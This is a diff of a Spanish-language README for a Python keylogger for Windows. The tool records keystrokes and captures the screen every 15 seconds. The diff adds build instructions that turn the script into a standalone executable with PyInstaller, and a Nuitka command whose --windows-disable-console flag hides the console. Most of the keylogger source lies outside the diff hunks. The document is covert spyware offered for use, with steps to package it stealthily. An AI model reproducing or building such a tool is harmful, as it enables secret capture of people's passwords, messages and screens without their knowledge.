@@ -1,21 +1,24 @@
 # py-keylogger-and-screenshot
-Un script de keylogger desarrollado en Python para la plataforma Windows, que no solo registra las pulsaciones de teclas, sino que también captura automáticamente la pantalla cada 15 segundos.
 
-### Comandos de Compilacion
+Un script de keylogger desarrollado en Python para la plataforma Windows, que registra las pulsaciones de teclas y captura automáticamente la pantalla cada 15 segundos.
 
-Con pyinstaller generar el `.spec` y agregar todas las dependencias al `.spec`
+### Comandos de Compilación
+-------------------------
+Con PyInstaller, genera el archivo `.spec` y agrega todas las dependencias al `.spec`.
 
-keylogger.spec
-```.spec
-    hiddenimports=['keyboard', 'sys', 'os', 'time', 'ctypes', 'datetime', 'threading', 'pyautogui', 'Pillow']
+**keylogger.spec**
+```python
+hiddenimports=['keyboard', 'sys', 'os', 'time', 'ctypes', 'datetime', 'threading', 'pyautogui', 'Pillow']
 ```
-Agregar al hide import las librerias y luego compilarlo desde el `.spec`
-```pyinstaller
+Agrega las librerías al `hiddenimports` y luego compílalo desde el archivo `.spec`:
+```bash
 pyinstaller .\keylogger.spec
 ```
 
-
-
+Con Nuitka (para compilar el script de Python en C):
+```
+nuitka --onefile --follow-imports --windows-disable-console --output-dir=Keylogger keylogger.py
+```
 -----------------------
 ```python
 import os
@@ -150,5 +153,4 @@ def IniciarKeylogger():
 
 # Iniciar el keylogger
 IniciarKeylogger()
-
 ```
